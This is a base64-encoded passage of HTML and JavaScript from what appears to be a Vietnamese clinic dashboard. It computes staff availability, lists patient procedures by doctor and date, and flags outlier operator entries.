GRpdiBzdHlsZT0iYmFja2dyb3VuZDojZmZmO3BhZGRpbmc6MzBweCA0MHB4O2JvcmRlci1yYWRpdXM6MTBweDt0ZXh0LWFsaWduOmNlbnRlcjtib3gtc2hhZG93OjAgMCAxNXB4IHJnYmEoMCwwLDAsMC4zKTttYXgtd2lkdGg6OTAlO2ZvbnQtc2l6ZToxOHB4Ij4NCjxkaXYgaWQ9ImxvYWRpbmdUZXh0Ij4NCjxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6IzM0OThkYjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgIMSQYW5nIGfhu61pIGThu68gbGnhu4d1IHbhu4EgbcOheSBjaOG7py4uLg0KICAgIDwvZGl2Pg0KPGRpdiBpZD0icHJvZ3Jlc3NCYXJDb250YWluZXIiPg0KPGRpdiBpZD0icHJvZ3Jlc3NCYXIiPjwvZGl2Pg0KPGRpdiBpZD0iYXZhaWxhYmlsaXR5VGFibGUiIHN0eWxlPSJkaXNwbGF5OiBub25lOyBtYXJnaW4tdG9wOiAyMHB4OyI+DQogIDxoMj5UaOG7kW5nIGvDqiBnaeG7nSB0cuG7kW5nIHThu6tuZyBuZ8aw4budaTwvaDI+DQogIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICANCiAgICAgICAgPHRoPkdp4budIHRy4buRbmcgYnXhu5VpIHPDoW5nPC90aD4NCiAgICAgICAgPHRoPkdp4budIHRy4buRbmcgYnXhu5VpIGNoaeG7gXU8L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iYXZhaWxhYmlsaXR5Qm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KPCEtLSBL4bq+VCBUSMOaQzogQuG6ok5HIEdJ4bucIFRS4buQTkcgVOG7qk5HIE5Hxq/hu5xJIC0tPg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQoNCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24oKSB7DQogIGNvbnN0IG5vaWR1bmcgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibm9pZHVuZyIpOw0KICBjb25zdCBsaXN0MSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5saXN0MSIpOw0KDQogIGlmIChub2lkdW5nICYmIGxpc3QxKSB7DQogICAgY29uc3QgdGV4dCA9IG5vaWR1bmcudGV4dENvbnRlbnQgfHwgbm9pZHVuZy5pbm5lclRleHQgfHwgIiI7DQogICAgaWYgKHRleHQudHJpbSgpID09PSAiIikgew0KICAgICAgbGlzdDEuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICB9DQogIH0NCn0pOw0KDQovLyA9PT09IFTDjU5IIFRPw4FOIEdJ4bucIFRS4buQTkcgQ0hPIFThu6pORyBOR8av4bucSSA9PT09DQoNCg0KDQpmdW5jdGlvbiB0b2dnbGVBdmFpbGFiaWxpdHkoKSB7DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5VGFibGUnKTsNCiAgICBjb25zdCBmaWx0ZXJCbG9jayA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlGaWx0ZXJCbG9jaycpOw0KICAgIGlmICh0YWJsZS5zdHlsZS5kaXNwbGF5ID09PSAnbm9uZScpIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGlmIChmaWx0ZXJCbG9jaykgZmlsdGVyQmxvY2suc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSgpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIGlmIChmaWx0ZXJCbG9jaykgZmlsdGVyQmxvY2suc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gY2FsY3VsYXRlQXZhaWxhYmlsaXR5KCkgew0KICAgIGNvbnN0IGdyb3VwcyA9IHt9Ow0KICAgIGFsbFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5vcGVyYXRvcn1fJHtwcm9jLmRhdGV9YDsNCiAgICAgICAgaWYgKCFncm91cHNba2V5XSkgZ3JvdXBzW2tleV0gPSBbXTsNCiAgICAgICAgZ3JvdXBzW2tleV0ucHVzaChwcm9jKTsNCiAgICB9KTsNCg0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eUJvZHknKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIGNvbnN0IHNlbGVjdGVkT3AgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyT3BlcmF0b3InKT8udmFsdWUgfHwgJ2FsbCc7DQogICAgY29uc3Qgc2VsZWN0ZWREYXRlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlckRhdGUnKT8udmFsdWUgfHwgJ2FsbCc7DQoNCiAgICAvLyBDaOG7iSBraOG7n2kgdOG6oW8gZHJvcGRvd24gMSBs4bqnbg0KICAgIGlmICghZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJykuZGF0YXNldC5pbml0aWFsaXplZCkgew0KICAgICAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAub3BlcmF0b3IpKV0uc29ydCgpOw0KICAgICAgICBjb25zdCBkYXRlcyA9IFsuLi5uZXcgU2V0KGFsbFByb2NlZHVyZXMubWFwKHAgPT4gcC5kYXRlKSldLnNvcnQoKGEsIGIpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IFtkYSwgbWEsIHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIGNvbnN0IFtkYiwgbWIsIHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSwgbWEgLSAxLCBkYSkgLSBuZXcgRGF0ZSh5YiwgbWIgLSAxLCBkYik7DQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IG9wU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJyk7DQogICAgICAgIGNvbnN0IGRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyRGF0ZScpOw0KDQogICAgICAgIG9wU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgICAgICBkYXRlU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIGRhdGVzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgb3BTZWxlY3QuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCiAgICAgICAgZGF0ZVNlbGVjdC5kYXRhc2V0LmluaXRpYWxpemVkID0gJ3RydWUnOw0KDQogICAgICAgIG9wU2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSk7DQogICAgICAgIGRhdGVTZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgY2FsY3VsYXRlQXZhaWxhYmlsaXR5KTsNCiAgICB9DQoNCiAgICBPYmplY3Qua2V5cyhncm91cHMpLmZvckVhY2goa2V5ID0+IHsNCiAgICAgICAgY29uc3QgW29wZXJhdG9yLCBkYXRlXSA9IGtleS5zcGxpdCgnXycpOw0KICAgICAgICBpZiAoKHNlbGVjdGVkT3AgIT09ICdhbGwnICYmIG9wZXJhdG9yICE9PSBzZWxlY3RlZE9wKSB8fA0KICAgICAgICAgICAgKHNlbGVjdGVkRGF0ZSAhPT0gJ2FsbCcgJiYgZGF0ZSAhPT0gc2VsZWN0ZWREYXRlKSkgcmV0dXJuOw0KDQogICAgICAgIGNvbnN0IHByb2NlZHVyZXMgPSBncm91cHNba2V5XTsNCiAgICAgICAgcHJvY2VkdXJlcy5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQoNCiAgICAgICAgY29uc3QgbW9ybmluZ1N0YXJ0ID0gNyAqIDM2MDA7DQogICAgICAgIGNvbnN0IG1vcm5pbmdFbmQgPSAxMS41ICogMzYwMDsNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uU3RhcnQgPSAxMy41ICogMzYwMDsNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uRW5kID0gMTcgKiAzNjAwOw0KDQogICAgICAgIGNvbnN0IG1vcm5pbmdGcmVlID0gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIG1vcm5pbmdTdGFydCwgbW9ybmluZ0VuZCk7DQogICAgICAgIGNvbnN0IGFmdGVybm9vbkZyZWUgPSBnZXRGcmVlU2xvdHMocHJvY2VkdXJlcywgYWZ0ZXJub29uU3RhcnQsIGFmdGVybm9vbkVuZCk7DQoNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8dGQ+PGEgaHJlZj0iIyIgb25jbGljaz0ic2hvd1Byb2NlZHVyZXNGb3JPcGVyYXRvcihcYCR7b3BlcmF0b3J9XGAsIFxgJHtkYXRlfVxgKTtyZXR1cm4gZmFsc2U7IiBzdHlsZT0iY29sb3I6IzM0OThkYjtmb250LXdlaWdodDpib2xkIj4ke29wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvYT48L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZGF0ZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7bW9ybmluZ0ZyZWV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2FmdGVybm9vbkZyZWV9PC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9KTsNCn0NCg0KDQpmdW5jdGlvbiBnZXRGcmVlU2xvdHMocHJvY2VkdXJlcywgc3RhcnQsIGVuZCkgew0KICAgIGNvbnN0IGJ1c3kgPSBwcm9jZWR1cmVzLm1hcChwID0+ICh7DQogICAgICAgIHN0YXJ0OiBwLnN0YXJ0LA0KICAgICAgICBlbmQ6IHAuZW5kICsgKChwLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwKQ0KICAgIH0pKS5maWx0ZXIocCA9PiBwLmVuZCA+IHN0YXJ0ICYmIHAuc3RhcnQgPCBlbmQpOw0KDQogICAgYnVzeS5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQoNCiAgICBjb25zdCBmcmVlID0gW107DQogICAgbGV0IGN1cnNvciA9IHN0YXJ0Ow0KDQogICAgZm9yIChjb25zdCBiIG9mIGJ1c3kpIHsNCiAgICAgICAgaWYgKGIuc3RhcnQgPiBjdXJzb3IgJiYgYi5zdGFydCA+IHN0YXJ0ICYmIGN1cnNvciA8IGVuZCkgew0KICAgICAgICAgICAgY29uc3QgZnJlZVN0YXJ0ID0gTWF0aC5tYXgoY3Vyc29yLCBzdGFydCk7DQogICAgICAgICAgICBjb25zdCBmcmVlRW5kID0gTWF0aC5taW4oYi5zdGFydCwgZW5kKTsNCiAgICAgICAgICAgIGlmIChmcmVlRW5kID4gZnJlZVN0YXJ0KSB7DQogICAgICAgICAgICAgICAgZnJlZS5wdXNoKGAke2Zvcm1hdFRpbWUoZnJlZVN0YXJ0KX0gLSAke2Zvcm1hdFRpbWUoZnJlZUVuZCl9YCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY3Vyc29yID0gTWF0aC5tYXgoY3Vyc29yLCBiLmVuZCk7DQogICAgfQ0KDQogICAgaWYgKGN1cnNvciA8IGVuZCkgew0KICAgICAgICBmcmVlLnB1c2goYCR7Zm9ybWF0VGltZShjdXJzb3IpfSAtICR7Zm9ybWF0VGltZShlbmQpfWApOw0KICAgIH0NCg0KICAgIHJldHVybiBmcmVlLmxlbmd0aCA/IGZyZWUuam9pbignPGJyPicpIDogJzxpPktow7RuZyBjw7JuIHRy4buRbmc8L2k+JzsNCn0NCg0KZnVuY3Rpb24gZm9ybWF0VGltZShzZWMpIHsNCiAgICBjb25zdCBoID0gTWF0aC5mbG9vcihzZWMgLyAzNjAwKTsNCiAgICBjb25zdCBtID0gTWF0aC5mbG9vcigoc2VjICUgMzYwMCkgLyA2MCk7DQogICAgcmV0dXJuIGgudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpICsgJ2gnICsgbS50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyk7DQp9DQoNCmZ1bmN0aW9uIHNob3dQcm9jZWR1cmVzRm9yT3BlcmF0b3Iob3BlcmF0b3IsIGRhdGUpIHsNCiAgICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZU92ZXJsYXknKTsNCiAgICBjb25zdCBjb250ZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BvcHVwQ29udGVudCcpOw0KICAgIGNvbnN0IGxpc3QgPSBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAub3BlcmF0b3IgPT09IG9wZXJhdG9yICYmIHAuZGF0ZSA9PT0gZGF0ZSk7DQoNCiAgICBpZiAobGlzdC5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSAiPGk+S2jDtG5nIHTDrG0gdGjhuqV5IHRo4bunIHRodeG6rXQ8L2k+IjsNCiAgICB9IGVsc2Ugew0KICAgICAgICBsaXN0LnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSAiPGI+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2I+ICIgKyBvcGVyYXRvciArICI8YnI+PGI+TmfDoHk6PC9iPiAiICsgZGF0ZSArICI8YnI+PGJyPiIgKw0KICAgICAgICAgICAgIjx1bCBzdHlsZT0ncGFkZGluZy1sZWZ0OjIwcHgnPiIgKyBsaXN0Lm1hcChwID0+IA0KICAgICAgICAgICAgICAgICI8bGk+PGI+IiArIHAucGF0aWVudE5hbWUgKyAiPC9iPiAtICIgKyBwLnByb2NlZHVyZSArICIgKCIgKyBwLmRpc3BsYXlTdGFydCArICIg4oaSICIgKyBwLmRpc3BsYXlFbmQgKyAiKTwvbGk+Ig0KICAgICAgICAgICAgKS5qb2luKCcnKSArICI8L3VsPiI7DQogICAgfQ0KDQogICAgb3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCn0NCg0KZnVuY3Rpb24gY2xvc2VQcm9jZWR1cmVQb3B1cCgpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvY2VkdXJlT3ZlcmxheScpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQp9DQo8L3NjcmlwdD4NCjwhLS0gUG9wdXAgdGjhu6cgdGh14bqtdCBjaGkgdGnhur90IHbhu5tpIG92ZXJsYXkgLS0+DQo8ZGl2IGlkPSJwcm9jZWR1cmVPdmVybGF5IiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjQpO3otaW5kZXg6MTAwMDAiIG9uY2xpY2s9ImNsb3NlUHJvY2VkdXJlUG9wdXAoKSI+DQogIDxkaXYgaWQ9InByb2NlZHVyZVBvcHVwIiBvbmNsaWNrPSJldmVudC5zdG9wUHJvcGFnYXRpb24oKSIgc3R5bGU9InBvc2l0aW9uOnJlbGF0aXZlO3RvcDoxMCU7bGVmdDo1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTUwJSk7YmFja2dyb3VuZDojZmZmO2NvbG9yOiMwMDA7Ym9yZGVyOjJweCBzb2xpZCAjMzQ5OGRiO3BhZGRpbmc6MjBweDtib3JkZXItcmFkaXVzOjhweDtib3gtc2hhZG93OjAgNXB4IDIwcHggcmdiYSgwLDAsMCwwLjMpO21heC1oZWlnaHQ6NzB2aDtvdmVyZmxvdzphdXRvO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWY7bWF4LXdpZHRoOjYwMHB4Ij4NCiAgICA8aDM+Q2hpIHRp4bq/dCB0aOG7pyB0aHXhuq10PC9oMz4NCiAgICA8ZGl2IGlkPSJwb3B1cENvbnRlbnQiPjwvZGl2Pg0KICAgIDxici8+DQogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVBvcHVwKCkiPsSQw7NuZzwvYnV0dG9uPg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQoNCg0KDQoNCjxzY3JpcHQ+DQpmdW5jdGlvbiByZW5kZXJIZXJiTGlzdCgpIHsNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVGFibGVCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgICBjb25zdCBoZXJicyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXTsNCiAgICBjb25zdCBkYXRlRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEYXRlRmlsdGVyJyk7DQogICAgY29uc3QgZG9jdG9yRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEb2N0b3JGaWx0ZXInKTsNCg0KICAgIGlmICghZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkKSB7DQogICAgICAgIGNvbnN0IHVuaXF1ZURhdGVzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGggPT4gaC5kYXRlKSldLnNvcnQoKGEsIGIpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IFtkYSwgbWEsIHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIGNvbnN0IFtkYiwgbWIsIHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSwgbWEgLSAxLCBkYSkgLSBuZXcgRGF0ZSh5YiwgbWIgLSAxLCBkYik7DQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IHVuaXF1ZURvY3RvcnMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaCA9PiBoLmRvY3RvciB8fCAnS2jDtG5nIGPDsycpKV0uc29ydCgpOw0KDQogICAgICAgIGRhdGVGaWx0ZXIuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICAgICAgdW5pcXVlRGF0ZXMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBkb2N0b3JGaWx0ZXIuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPicgKw0KICAgICAgICAgICAgdW5pcXVlRG9jdG9ycy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIGRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCA9ICJ0cnVlIjsNCiAgICAgICAgZGF0ZUZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCByZW5kZXJIZXJiTGlzdCk7DQogICAgICAgIGRvY3RvckZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCByZW5kZXJIZXJiTGlzdCk7DQogICAgfQ0KDQogICAgY29uc3Qgc2VsZWN0ZWREYXRlID0gZGF0ZUZpbHRlci52YWx1ZTsNCiAgICBjb25zdCBzZWxlY3RlZERvY3RvciA9IGRvY3RvckZpbHRlci52YWx1ZTsNCg0KICAgIGNvbnN0IGZpbHRlcmVkSGVyYnMgPSBoZXJicy5maWx0ZXIocCA9Pg0KICAgICAgICAoc2VsZWN0ZWREYXRlID09PSAnYWxsJyB8fCBwLmRhdGUgPT09IHNlbGVjdGVkRGF0ZSkgJiYNCiAgICAgICAgKHNlbGVjdGVkRG9jdG9yID09PSAnYWxsJyB8fCBwLmRvY3RvciA9PT0gc2VsZWN0ZWREb2N0b3IpDQogICAgKTsNCg0KICAgIGlmIChmaWx0ZXJlZEhlcmJzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGA8dGQgY29sc3Bhbj0iNSI+PGNlbnRlcj5LaMO0bmcgY8OzIGThu68gbGnhu4d1IHPhuq9jIHRodeG7kWMgdGhhbmc8L2NlbnRlcj48L3RkPmA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBmaWx0ZXJlZEhlcmJzLmZvckVhY2gocCA9PiB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPiR7cC5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AuZGF0ZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5kaXNwbGF5U3RhcnR9IOKGkiAke3AuZGlzcGxheUVuZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICBgOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0pOw0KfQ0KDQoNCmZ1bmN0aW9uIHRvZ2dsZUhlcmJMaXN0KCkgew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJQcm9jZWR1cmVUYWJsZScpOw0KICAgIGlmICh0YWJsZS5zdHlsZS5kaXNwbGF5ID09PSAnbm9uZScpIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHJlbmRlckhlcmJMaXN0KCk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICB9DQp9DQo8L3NjcmlwdD4NCg0KDQoNCjxzY3JpcHQ+DQooZnVuY3Rpb24oKXsNCiAgLyogPT09PSBUSeG7hk4gw41DSCBDSFXhuqhOIEhPw4EgVMOKTiA9PT09ICovDQogIGZ1bmN0aW9uIGNsZWFuRGlzcGxheShuYW1lKXsNCiAgICByZXR1cm4gKG5hbWV8fCcnKQ0KICAgICAgLnRvU3RyaW5nKCkNCiAgICAgIC5yZXBsYWNlKC9bLO+8jF0rXHMqJC8sJycpDQogICAgICAucmVwbGFjZSgvXHMrL2csJyAnKQ0KICAgICAgLnRyaW0oKTsNCiAgfQ0KICBmdW5jdGlvbiBub3JtKG5hbWUpew0KICAgIHJldHVybiBjbGVhbkRpc3BsYXkobmFtZSkudG9Mb3dlckNhc2UoKTsNCiAgfQ0KDQogIC8qID09PT0gVMONTkggxJBBIFPhu5AgVEhFTyBOR8OAWSA9PT09ICovDQogIGZ1bmN0aW9uIGNvbXB1dGVNYWpvcml0eUJ5RGF0ZShyb3dzKXsNCiAgICBjb25zdCBtYXAgPSBPYmplY3QuY3JlYXRlKG51bGwpOw0KICAgIHJvd3MuZm9yRWFjaChyPT57DQogICAgICBjb25zdCBkID0gci5kYXRlOw0KICAgICAgY29uc3QgbiA9IG5vcm0oci5vcGVyYXRvcik7DQogICAgICBpZighbiB8fCBuID09PSAna2jDtG5nIGPDsycpIHJldHVybjsNCiAgICAgIChtYXBbZF18fChtYXBbZF09e30pKVtuXSA9IChtYXBbZF1bbl18fDApKzE7DQogICAgfSk7DQogICAgY29uc3Qgb3V0ID0ge307DQogICAgT2JqZWN0LmtleXMobWFwKS5mb3JFYWNoKGQ9PnsNCiAgICAgIGNvbnN0IGFyciA9IE9iamVjdC5lbnRyaWVzKG1hcFtkXSkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICAgIGNvbnN0IHRvcCA9IGFyclswXSB8fCBbbnVsbCwwXTsNCiAgICAgIGNvbnN0IHNlY29uZCA9IGFyclsxXSB8fCBbbnVsbCwwXTsNCiAgICAgIG91dFtkXSA9IHsgdG9wTm9ybTp0b3BbMF0sIHRvcENvdW50OnRvcFsxXSwgc2Vjb25kQ291bnQ6c2Vjb25kWzFdIH07DQogICAgfSk7DQogICAgcmV0dXJuIG91dDsNCiAgfQ0KDQogIC8qID09PT0gVUkgUEjhu6Q6IFTDk00gVOG6rlQgKyBQT1BVUCA9PT09ICovDQogIGZ1bmN0aW9uIGVuc3VyZU91dGxpZXJVSSgpew0KICAgIGNvbnN0IHN1bW1hcnkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJTdW1tYXJ5Jyk7DQogICAgY29uc3QgbW9kYWwgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsJyk7DQogICAgaWYoIXN1bW1hcnkpIGNvbnNvbGUud2FybignVGhp4bq/dSAjaGVyYk91dGxpZXJTdW1tYXJ5IHRyb25nIEhUTUwhJyk7DQogICAgaWYoIW1vZGFsKSAgIGNvbnNvbGUud2FybignVGhp4bq/dSAjaGVyYk91dGxpZXJNb2RhbCB0cm9uZyBIVE1MIScpOw0KICAgIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckNsb3NlQnRuJyk7DQogICAgY29uc3QgYmFja2Ryb3AgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJCYWNrZHJvcCcpOw0KICAgIGlmKGJ0bikgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9Pm1vZGFsLnN0eWxlLmRpc3BsYXk9J25vbmUnKTsNCiAgICBpZihiYWNrZHJvcCkgYmFja2Ryb3AuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKT0+bW9kYWwuc3R5bGUuZGlzcGxheT0nbm9uZScpOw0KICB9DQogIGVuc3VyZU91dGxpZXJVSSgpOw0KDQogIC8qID09PT0gR0hJIMSQw4ggSMOATSBSRU5ERVIgPT09PSAqLw0KLyogPT09PSBHSEkgxJDDiCBIw4BNIFJFTkRFUiA9PT09ICovDQoNCi8vIGhlbHBlcjogdHLhuqMgduG7gSBkYW5oIHPDoWNoIG5nw6B5IGPDsyBjYSBz4bqvYyB0aHXhu5FjIGzhu5dpDQpmdW5jdGlvbiBnZXRIZXJiRXJyb3JEYXRlcyhhbGxIZXJicyl7DQogIGNvbnN0IG1ham9yaXR5ID0gY29tcHV0ZU1ham9yaXR5QnlEYXRlKGFsbEhlcmJzKTsNCiAgY29uc3QgZGF0ZXMgPSBuZXcgU2V0KCk7DQoNCiAgY